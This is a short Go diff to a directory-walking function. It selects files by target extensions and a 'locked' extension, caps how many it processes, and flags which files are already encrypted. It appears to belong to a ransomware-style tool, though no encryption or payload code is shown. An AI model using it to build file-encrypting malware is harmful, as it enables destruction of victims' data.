@@ -8,7 +8,7 @@ import (
 )
 
 // Walk recursively walks the input directory and applies all rules (extensions, limits etc)
-func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo)) {
+func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo, isEncrypted bool)) {
 	var count int
 	filepath.Walk(startPath, func(filePath string, fileInfo os.FileInfo, err error) error {
 		if err != nil {
@@ -18,7 +18,7 @@ func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo)
 
 		var proceed bool
 		for _, v := range Extensions {
-			if strings.HasSuffix(filePath, v) {
+			if strings.HasSuffix(filePath, v) || strings.HasSuffix(filePath, LockedExtension) {
 				proceed = true
 				break
 			}
@@ -34,7 +34,9 @@ func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo)
 		if proceed && count < ProcessMax {
 			count++
 
-			callback(filePath, fileInfo)
+			isEncrypted := strings.HasSuffix(filePath, LockedExtension)
+
+			callback(filePath, fileInfo, isEncrypted)
 		}
 
 		return nil
